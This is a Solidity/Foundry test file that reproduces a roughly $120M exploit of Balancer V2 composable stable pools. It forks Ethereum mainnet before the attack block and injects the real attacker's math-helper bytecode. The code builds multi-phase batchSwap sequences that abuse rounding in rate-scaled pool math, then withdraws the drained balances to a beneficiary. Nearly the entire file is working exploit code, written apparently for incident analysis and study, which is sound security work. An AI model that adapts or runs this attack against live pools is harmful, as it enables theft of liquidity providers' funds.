pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../interface.sol";
import "../StableMath.sol";

// @KeyInfo - Total Lost : 120M USD
// Attacker : https://etherscan.io/address/0x506d1f9efe24f0d47853adca907eb8d89ae03207
// Attack Contract : https://etherscan.io/address/0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d
// Vulnerable Contract : 
// Attack Tx: https://app.blocksec.com/explorer/tx/eth/0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742
// Withdrawal Tx: https://app.blocksec.com/explorer/tx/eth/0xd155207261712c35fa3d472ed1e51bfcd816e616dd4f517fa5959836f5b48569

// @Info
// Whitehat back-run/rescue bot
// Rescue bot    : https://etherscan.io/address/0x5af00b073abb9f88832353bd4c919caaa114c972
// Back-run Tx   : https://app.blocksec.com/phalcon/explorer/tx/eth/0x1dc60f917e4d841f281e827cf82f93c7355e08f5855e9ae5b0a1764b38ed4b87
// Withdrawal Tx : https://app.blocksec.com/phalcon/explorer/tx/eth/0x0d6f2d90c543e137b59318d6c557f772fa638da757c2c8c095c7076d6fbb159d
//                 https://app.blocksec.com/phalcon/explorer/tx/eth/0xaa52c3a7a0d5264a08d0447c8141274ff6e73e9c2560e3b686f4e4a9854d77ec

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/BlockSecTeam/status/1986057732810518640, https://x.com/SlowMist_Team/status/1986379316935205299, https://x.com/hklst4r/status/1985872151077953827
// Twitter Guy : https://x.com/BlockSecTeam/status/1986057732810518640, https://x.com/SlowMist_Team/status/1986379316935205299, https://x.com/hklst4r/status/1985872151077953827
// Hacking God : N/A

// @Variant — purpose of THIS file vs BalancerV2_exp.sol
// This is the SAME attack as BalancerV2_exp.sol, but gas-optimized. Instead of a
// re-implemented Solidity math helper, it injects (via vm.etch, in setUp) the EXACT real
// on-chain runtime bytecode of the attacker's math helper contract
// 0x679B362B9f38BE63FbD4A499413141A997eb381e. That helper was deployed IN the attack's own
// block (23717397), so it is absent from the pre-attack fork state (23717396); etching it in
// lets the phase-2 precompute run the very math the attacker actually used, which saves gas.
// The pool state is untouched and the attack result is unchanged. The internal test contract
// is named ContractTest679B, referencing that 0x679B... helper.

address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant balancer = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant osETH_wETH = 0xDACf5Fa19b1f720111609043ac67A9818262850c;
address constant wstETH_wETH = 0x93d199263632a4EF4Bb438F1feB99e57b4b5f0BD;
address constant osToken = 0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38;
address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
address constant attacker = 0x506D1f9EFe24f0d47853aDca907EB8d89AE03207;
address constant beneficiary = 0xAa760D53541d8390074c61DEFeaba314675b8e3f;

contract ContractTest679B is Test {
    function setUp() public {
        // Use an archive RPC (vm.store below needs eth_getStorageAt at this historical
        // block). ETH_RPC_URL overrides; default to a public archive endpoint. Same block
        // and state as the original, so the attack result is unchanged.
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://eth-mainnet.public.blastapi.io")), 23717397 - 1);
        // The optimized math helper 0x679B... was deployed IN block 23717397 (the attack's
        // own block), so it is absent from the pre-attack fork state (23717396). Inject its
        // EXACT real runtime bytecode via vm.etch (pool state untouched) so the phase-2
        // precompute uses the same optimized math the attacker used. Set admin0 (slot 0) to
        // tx.origin so the helper's tx.origin allow-list guard passes for this test's origin.
        address mh = 0x679B362B9f38BE63FbD4A499413141A997eb381e;
        vm.etch(mh, hex"608060405234801561001057600080fd5b506004361061002b5760003560e01c8063524c9e2014610030575b600080fd5b61004361003e366004610838565b610059565b60405161005091906108c5565b60405180910390f35b60005460609073ffffffffffffffffffffffffffffffffffffffff16321480610099575060015473ffffffffffffffffffffffffffffffffffffffff1632145b6100be5760405162461bcd60e51b81526004016100b590610909565b60405180910390fd5b6000885167ffffffffffffffff811180156100d857600080fd5b50604051908082528060200260200182016040528015610102578160200160208202803683370190505b50905060005b895181101561016a57670de0b6b3a764000089828151811061012657fe5b60200260200101518b838151811061013a57fe5b6020026020010151028161014a57fe5b0482828151811061015757fe5b6020908102919091010152600101610108565b506000670de0b6b3a764000089888151811061018257fe5b602002602001015187028161019357fe5b04905060006101a28684610297565b905060006101b487858c8c87876103fa565b905060008b8b815181106101c457fe5b602002602001015160018d8d815181106101da57fe5b602002602001015184670de0b6b3a7640000020103816101f657fe5b049050600087670de0b6b3a76400000360018984670de0b6b3a764000002670de0b6b3a76400000103038161022757fe5b049050808e8d8151811061023757fe5b6020026020010151018e8d8151811061024c57fe5b602002602001018181525050898e8c8151811061026557fe5b6020026020010151038e8c8151811061027a57fe5b6020908102919091010152509b9c9b505050505050505050505050565b80516000908190815b818110156102d8576102ce8582815181106102b757fe5b6020026020010151846104af90919063ffffffff16565b92506001016102a0565b50816102e9576000925050506103f4565b600082868302825b60ff8110156103e2578260005b8681101561033f5761033561031383876104c8565b6103308c848151811061032257fe5b60200260200101518a6104c8565b6104ec565b91506001016102fe565b50839450610398610377610371610356848a6104c8565b61036b610363888d6104c8565b6103e86104ec565b906104af565b866104c8565b61033061038789600101856104c8565b61036b6103636103e889038a6104c8565b9350848411156103c0576001858503116103bb57839750505050505050506103f4565b6103d9565b6001848603116103d957839750505050505050506103f4565b506001016102f1565b506103ee61014161050c565b50505050505b92915050565b60006104228387868151811061040c57fe5b602002602001015161053990919063ffffffff16565b86858151811061042e57fe5b60200260200101818152505060006104488888858961054f565b90508387868151811061045757fe5b60200260200101510187868151811061046c57fe5b6020026020010181815250506104a3600161036b89898151811061048c57fe5b60200260200101518461053990919063ffffffff16565b98975050505050505050565b60008282016104c18482101583610718565b9392505050565b60008282026104c18415806104e55750838583816104e257fe5b04145b6003610718565b60006104fb8215156004610718565b81838161050457fe5b049392505050565b610536817f42414c000000000000000000000000000000000000000000000000000000000061072a565b50565b6000610549838311156001610718565b50900390565b60008084518602905060008560008151811061056757fe5b60200260200101519050600086518760008151811061058257fe5b60200260200101510290506000600190505b87518110156105e8576105cd6105c76105c0848b85815181106105b357fe5b60200260200101516104c8565b8a516104c8565b886104ec565b91506105de8882815181106102b757fe5b9250600101610594565b508685815181106105f557fe5b602002602001015182039150600061060d87886104c8565b9050600061063e61063261062a8461062589886104c8565b61078b565b6103e86104c8565b8a89815181106105b357fe5b9050600061065961065261062a8b896104ec565b86906104af565b905060008061067561066b86866104af565b6106258d866104af565b905060005b60ff8110156106fb578192506106b06106978661036b85866104c8565b6106258e6106aa8861036b8860026104c8565b90610539565b9150828211156106d9576001838303116106d4575097506107109650505050505050565b6106f3565b6001828403116106f3575097506107109650505050505050565b60010161067a565b5061070761014261050c565b50505050505050505b949350505050565b81610726576107268161050c565b5050565b62461bcd60e51b600090815260206004526007602452600a808404818106603090810160081b958390069590950190829004918206850160101b01602363ffffff0060e086901c160160181b0190930160c81b60445260e882901c90606490fd5b600061079a8215156004610718565b50811515600019909201046001010290565b600082601f8301126107bc578081fd5b8135602067ffffffffffffffff808311156107d357fe5b818302604051838282010181811084821117156107ec57fe5b6040528481528381019250868401828801850189101561080a578687fd5b8692505b8583101561082c57803584529284019260019290920191840161080e565b50979650505050505050565b600080600080600080600060e0888a031215610852578283fd5b873567ffffffffffffffff80821115610869578485fd5b6108758b838c016107ac565b985060208a013591508082111561088a578485fd5b506108978a828b016107ac565b979a9799505050506040860135956060810135956080820135955060a0820135945060c09091013592509050565b6020808252825182820181905260009190848201906040850190845b818110156108fd578351835292840192918401916001016108e1565b50909695505050505050565b60208082526001908201527f580000000000000000000000000000000000000000000000000000000000000060408201526060019056fea264697066735822122042fa4b1bd8f1386b14de953915a5597d5538d2fd4eae05c122ff8f2dbeb1351364736f6c63430007060033");
        vm.store(mh, bytes32(uint256(0)), bytes32(uint256(uint160(tx.origin))));
    }

    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(weth).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(osETH_wETH).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(osToken).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(wstETH).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(wstETH_wETH).balanceOf(address(beneficiary)), 18);
        // vm.startPrank(attacker, attacker);
        vm.warp(1762156007); // block 23717397's timestamp, so rate provider returns the same rate as the real attack
        AttackerC attC = new AttackerC();
        attC.attack(osETH_wETH, 67000, 30); // offline computing numbers
        attC.withdraw(osETH_wETH);

        attC.attack(wstETH_wETH, 100000000000, 25); // offline computing numbers
        attC.withdraw(wstETH_wETH);
        // vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of address(beneficiary)", IERC20(weth).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("after attack: balance of address(beneficiary)", IERC20(osETH_wETH).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("after attack: balance of address(beneficiary)", IERC20(osToken).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("after attack: balance of address(beneficiary)", IERC20(wstETH).balanceOf(address(beneficiary)), 18);
        emit log_named_decimal_uint("after attack: balance of address(beneficiary)", IERC20(wstETH_wETH).balanceOf(address(beneficiary)), 18);
    }
}

contract Helper {
    using FixedPoint for uint256;

    function swapGivenOut(
        uint256[] memory balances,        
        uint256[] memory scalingFactors,  
        uint256 tokenIndexIn,             
        uint256 tokenIndexOut,            
        uint256 tokenAmountOut,                
        uint256 amplificationParameter,                      
        uint256 swapFee                   
    ) public view returns (uint256[] memory) {
        uint256 n = balances.length;
        uint256[] memory balanceScaled = new uint256[](n);
        for (uint256 i = 0; i < n; i++) {
            balanceScaled[i] = FixedPoint.mulDown(balances[i], scalingFactors[i]);
        }

        uint256 invariant = StableMath._calculateInvariant(amplificationParameter, balanceScaled);
        uint256 amountOutScaled = FixedPoint.mulDown(tokenAmountOut, scalingFactors[tokenIndexOut]); // precision loss here
        uint256 amountInScaled = StableMath._calcInGivenOut(
            amplificationParameter,
            balanceScaled,
            tokenIndexIn,
            tokenIndexOut,
            amountOutScaled,
            invariant
        );
        // Downscale first (round up), then add fee — matches on-chain BaseGeneralPool._swapGivenOut
        uint256 rawAmountIn = FixedPoint.divUp(amountInScaled, scalingFactors[tokenIndexIn]);
        rawAmountIn = FixedPoint.divUp(rawAmountIn, FixedPoint.ONE.sub(swapFee));

        balances[tokenIndexOut] = balances[tokenIndexOut].sub(tokenAmountOut);
        balances[tokenIndexIn] = balances[tokenIndexIn].add(rawAmountIn);
        
        return balances;
    }


    function get_trickAmt(uint256 scalingfactor) public pure returns (uint256 trickAmt) {
        trickAmt = 10000 / ((scalingfactor - 1e18) * 10000 / 1e18);
        return trickAmt;
    }

    // `idx` must be the RATE-BEARING token: the non-BPT token that has a rate provider
    // (equivalently, scalingFactor > 1e18). The exploit manipulates *that* token's oracle
    // rate, and get_trickAmt(scalingFactors[idx]) divides by (scalingFactor - 1e18), so a
    // plain token (e.g. wETH, scalingFactor == 1e18) would cause a divide-by-zero.
    //
    // Selecting by MAX BALANCE (previous logic) is incorrect: the token with the larger
    // balance is not necessarily the rate-bearing one -- that only held here by coincidence
    // of pool composition. Pick deterministically via the pool's rate providers instead.
    function get_index(
        address pool,
        address[] memory tokens,
        uint256 BptIndex
    ) public returns (uint256) {
        address[] memory rateProviders = IComposableStablePool(pool).getRateProviders();
        require(rateProviders.length == tokens.length, "get_index: rateProviders/tokens length mismatch");
        for (uint256 i = 0; i < tokens.length; i++) {
            if (i == BptIndex) continue;
            if (rateProviders[i] != address(0)) {
                return i; // the (single) non-BPT token with a rate provider
            }
        }
        revert("get_index: no rate-bearing token (with a rate provider) found");
    }


    function concat_steps(
        IBalancerVault.BatchSwapStep[] memory a,
        IBalancerVault.BatchSwapStep[] memory b
    ) public returns (IBalancerVault.BatchSwapStep[] memory) {
        IBalancerVault.BatchSwapStep[] memory c = new IBalancerVault.BatchSwapStep[](
            a.length + b.length
        );
        uint256 k = 0;
        for (uint256 i = 0; i < a.length; i++) c[k++] = a[i];
        for (uint256 i = 0; i < b.length; i++) c[k++] = b[i];
        return c;
    }

    function get_amount(uint256 actualSupply) public pure returns (uint256) {
        uint256 a = uint256(actualSupply * 10030 / 10000);

        return uint256((a - get_base(a)) / 2) + 1;
    }


    function get_base(uint256 v) public pure returns (uint256) {
        uint base = 1e4;
        while (base * 1e3 < v) base = base * 1e3;
        return base;
    }

    function trim(uint256 n) public pure returns (uint256) {
        if (n < 100) return n;

        uint256 initBalance = n;
        uint256 pow = 1;

        while (initBalance > 100) {
            initBalance = initBalance / 10;
            pow = pow * 10;
        }
        return n / pow * pow;
    }

}

/// @notice The gas-optimized math helper the REAL attacker deployed and used
/// (0x679B362B9f38BE63FbD4A499413141A997eb381e), selector 0x524c9e20 -- same swapGivenOut
/// signature/semantics as Helper, but hand-optimized bytecode. Calling the real deployed
/// bytecode guarantees the math is byte-identical to the on-chain attack (no re-derivation).
interface IMathHelper {
    function swapGivenOut(
        uint256[] memory balances,
        uint256[] memory scalingFactors,
        uint256 tokenIndexIn,
        uint256 tokenIndexOut,
        uint256 tokenAmountOut,
        uint256 amplificationParameter,
        uint256 swapFeePercentage
    ) external returns (uint256[] memory);
}

// 0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d
contract AttackerC {
    Helper public helper = new Helper();
    // Real on-chain optimized math helper (0x679B) used for the phase-2 precompute.
    IMathHelper public mathHelper = IMathHelper(0x679B362B9f38BE63FbD4A499413141A997eb381e);
    
    uint256 constant MAX_STEPS = 300;

    function prepare_phase1_steps(
        bytes32 poolId,
        address[] memory tokens,
        uint256[] memory balances,
        uint256 BptIndex,
        uint256 initBalance
    ) public returns (IBalancerVault.BatchSwapStep[] memory steps) {
        IBalancerVault.BatchSwapStep[] memory buffer = new IBalancerVault.BatchSwapStep[](MAX_STEPS);
        uint256[] memory preAmount = new uint256[](tokens.length);
        uint256[] memory sumAmounts = new uint256[](tokens.length);

        uint256 amount;
        uint256 nextAmount;
        bool exit = false;
        uint256 stepCount = 0;
        while (!exit) {
            for (uint256 assetOutIndex = 0; assetOutIndex < tokens.length; assetOutIndex++) {
                if (assetOutIndex == BptIndex) continue;
                if (preAmount[assetOutIndex] == 0) {
                    amount = 99 * balances[assetOutIndex] - 99 * initBalance;
                } else {
                    amount = preAmount[assetOutIndex] - 99 * uint256(preAmount[assetOutIndex] / 100);
                }
                preAmount[assetOutIndex] = amount;
                amount = amount / 100;
                nextAmount = preAmount[assetOutIndex] - 99 * uint256(preAmount[assetOutIndex] / 100);
                if (nextAmount < 100) {
                    exit = true;
                    amount = balances[assetOutIndex] - sumAmounts[assetOutIndex] - initBalance;
                } else {
                    sumAmounts[assetOutIndex] += amount;
                }

                buffer[stepCount] = IBalancerVault.BatchSwapStep({
                    poolId: poolId,
                    assetInIndex: BptIndex, // BPT
                    assetOutIndex: assetOutIndex,
                    amount: amount,
                    userData: bytes("")
                });

                stepCount++;
            }
        }

        IBalancerVault.BatchSwapStep[] memory steps = new IBalancerVault.BatchSwapStep[](stepCount);
        for (uint256 i = 0; i < stepCount; i++) {
            steps[i] = buffer[i];
        }

        return steps;
    }

    function prepare_phase2_steps(
        bytes32 poolId,
        uint256[] memory scalingFactors,  
        uint256 amplificationParameter,                      
        uint256 swapFee,
        uint256 maxRounds,
        uint256 initBalance,
        uint256 trickAmt,
        uint256 tokenIndexIn,
        uint256 tokenIndexOut,
        uint256 indexIn,
        uint256 indexOut
    ) public returns (IBalancerVault.BatchSwapStep[] memory steps) {
        IBalancerVault.BatchSwapStep[] memory buffer = new IBalancerVault.BatchSwapStep[](MAX_STEPS);
        uint256[] memory balances = new uint256[](2);
        balances[0] = initBalance;
        balances[1] = initBalance;
        uint256 amount = balances[1];
        uint256 stepCount = 0;
        for (uint256 round = 0; round < maxRounds; ++round) {
            balances = mathHelper.swapGivenOut(balances, scalingFactors, tokenIndexIn, tokenIndexOut, amount - trickAmt - 1, amplificationParameter, swapFee);
            buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: indexIn,
                assetOutIndex: indexOut,
                amount: amount - trickAmt - 1,
                userData: bytes("")
            });

            balances = mathHelper.swapGivenOut(balances, scalingFactors, tokenIndexIn, tokenIndexOut, trickAmt, amplificationParameter, swapFee);
            buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: indexIn,
                assetOutIndex: indexOut,
                amount: trickAmt,
                userData: bytes("")
            });
            amount = helper.trim(balances[tokenIndexIn]);
            for (uint256 j = 0; j < 3; ++j) {
                try mathHelper.swapGivenOut(balances, scalingFactors, tokenIndexOut, tokenIndexIn, amount, amplificationParameter, swapFee) returns (uint256[] memory newBalances) {
                    buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                        poolId: poolId,
                        assetInIndex: indexOut,
                        assetOutIndex: indexIn,
                        amount: amount,
                        userData: bytes("")
                    });
                    balances = newBalances;
                    amount = balances[tokenIndexOut];
                    break;
                } catch {
                    amount = (amount * 9) / 10;
                    continue;
                }
            }
        }

        IBalancerVault.BatchSwapStep[] memory steps = new IBalancerVault.BatchSwapStep[](stepCount);
        for (uint256 i = 0; i < stepCount; ++i) {
            steps[i] = buffer[i];
        }

        return steps;
    }

    function prepare_phase3_steps(
        bytes32 poolId,
        uint256 actualSupply
    ) public returns (IBalancerVault.BatchSwapStep[] memory steps) {
        IBalancerVault.BatchSwapStep[] memory buffer = new IBalancerVault.BatchSwapStep[](MAX_STEPS);
        uint256 amount = 1e4;
        uint256 stepCount = 0;

        // Dynamic ramp: stop when amount reaches get_base(a) to match pool supply
        uint256 a = actualSupply * 10030 / 10000;
        uint256 base = helper.get_base(a);

        bool useAsset0 = true;
        while (amount < base) {
            buffer[stepCount++] = IBalancerVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: useAsset0 ? 0 : 2,
                assetOutIndex: 1,
                amount: amount,
                userData: bytes("")
            });
            amount = amount * 1e3;
            useAsset0 = !useAsset0;
        }

        buffer[stepCount++] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: useAsset0 ? 0 : 2,
            assetOutIndex: 1,
            amount: amount,
            userData: bytes("")
        });
        useAsset0 = !useAsset0;
        amount = helper.get_amount(actualSupply);
        buffer[stepCount++] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: useAsset0 ? 0 : 2,
            assetOutIndex: 1,
            amount: amount,
            userData: bytes("")
        });
        useAsset0 = !useAsset0;
        buffer[stepCount++] = IBalancerVault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: useAsset0 ? 0 : 2,
            assetOutIndex: 1,
            amount: amount,
            userData: bytes("")
        });

        IBalancerVault.BatchSwapStep[] memory steps = new IBalancerVault.BatchSwapStep[](stepCount);
        for (uint256 i = 0; i < stepCount; ++i) {
            steps[i] = buffer[i];
        }

        return steps;
    }

    // https://etherscan.io/tx/0x6ed07db1a9fe5c0794d44cd36081d6a6df103fab868cdd75d581e3bd23bc9742
    function attack(address pool, uint256 initBalance, uint256 loops) public {
        bytes32 poolId = IComposableStablePool(pool).getPoolId(); 
        uint256 BptIndex = IComposableStablePool(pool).getBptIndex(); 
        (address[] memory tokens, uint256[] memory startBalances, uint256 startBlock) = IBalancerVault(balancer).getPoolTokens(poolId); 

        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20(address(tokens[i])).approve(balancer, type(uint256).max);
        }

        uint256 idx = helper.get_index(pool, tokens, BptIndex);
        // Refresh the token rate cache BEFORE reading scalingFactors so that
        // sf[idx] reflects the live oracle rate instead of the stale cached value.
        // trickAmt = floor(1e18 / (sf - 1e18)) is sensitive to sf at the integer
        // boundary; using a stale sf could yield a wrong trickAmt and cause NR divergence.
        IComposableStablePool(pool).updateTokenRateCache(tokens[idx]);
        uint256[] memory scalingFactors = IComposableStablePool(pool).getScalingFactors();
        uint256 indexIn = 0;
        uint256 indexOut = 2;
        
        uint256 tokenIndexIn = 0;
        uint256 tokenIndexOut = 1;

        if (idx == 0) {
            indexIn = 2;
            indexOut = 0;
        
            tokenIndexIn = 1;
            tokenIndexOut = 0; 
        }

        uint256 trickAmt = helper.get_trickAmt(scalingFactors[idx]);
        (uint256 amplificationParameter, bool isUpdating, uint256 precision) = IComposableStablePool(pool).getAmplificationParameter();
        uint256 swapFeePercentage = IComposableStablePool(pool).getSwapFeePercentage();
        // pool.getRate() returns BPT price (invariant/actualSupply), NOT the token
        // oracle rate, and is never used in the attack math — removed dead variable.
        (, uint256[] memory balances, uint256 lastChangeBlock) = IBalancerVault(balancer).getPoolTokens(poolId);
        uint256 actualSupply = IComposableStablePool(pool).getActualSupply();

        IBalancerVault.BatchSwapStep[] memory phase1steps = prepare_phase1_steps(
            poolId,
            tokens,
            balances,
            BptIndex,
            initBalance
        );
        // except the bpt token
        uint256[] memory newScalingFactors = new uint256[](2);
        newScalingFactors[0] = scalingFactors[0];
        newScalingFactors[1] = scalingFactors[2];

        IBalancerVault.BatchSwapStep[] memory phase2steps = prepare_phase2_steps(
            poolId,
            newScalingFactors,
            amplificationParameter,
            swapFeePercentage,
            loops,
            initBalance,
            trickAmt,
            tokenIndexIn,
            tokenIndexOut,
            indexIn,
            indexOut
        );

        IBalancerVault.BatchSwapStep[] memory phase3steps = prepare_phase3_steps(
            poolId,
            actualSupply
        );
        IBalancerVault.BatchSwapStep[] memory steps = helper.concat_steps(
            helper.concat_steps(phase1steps, phase2steps), 
            phase3steps
        );

        int256[] memory limits = new int256[](3);
        limits[0] = 0x400000000000000000000000000000000000000000000000000000000000000;
        limits[1] = 0x400000000000000000000000000000000000000000000000000000000000000;
        limits[2] = 0x400000000000000000000000000000000000000000000000000000000000000;
        
        IBalancerVault(balancer).batchSwap(IBalancerVault.SwapKind.GIVEN_OUT, steps, tokens, IBalancerVault.FundManagement({
            sender: address(this),
            fromInternalBalance: true,
            recipient: payable(address(this)),
            toInternalBalance: true
        }), limits, block.timestamp);
    }

    // https://etherscan.io/tx/0xd155207261712c35fa3d472ed1e51bfcd816e616dd4f517fa5959836f5b48569
    function withdraw(address pool) public {
        bytes32 poolId = IComposableStablePool(pool).getPoolId(); // 0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635
        (address[] memory tokens, uint256[] memory startBalances, uint256 startBlock) = IBalancerVault(balancer).getPoolTokens(poolId); //
        (uint256[] memory balances) = IBalancerVault(balancer).getInternalBalance(address(this), tokens);

        IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](tokens.length);
        for (uint256 i = 0; i < tokens.length; i++) {
            ops[i] = IBalancerVault.UserBalanceOp({
                kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                asset: tokens[i],
                amount: balances[i],
                sender: address(this),
                recipient: payable(beneficiary)
            });
        }

        IBalancerVault(balancer).manageUserBalance(ops);
    }
}

interface IComposableStablePool {
	function getPoolId() external returns (bytes32);
    function getBptIndex() external returns (uint256);
    function approve(address, uint256) external returns (bool);
    function getScalingFactors() external returns (uint256[] memory);
    function getRateProviders() external returns (address[] memory);
    function updateTokenRateCache(address) external;
    function getAmplificationParameter() external returns (uint256, bool, uint256);
    function getSwapFeePercentage() external returns (uint256);
    function getRate() external returns (uint256);
    function getActualSupply() external returns (uint256);
	function balanceOf(address) external returns (uint256); 
}
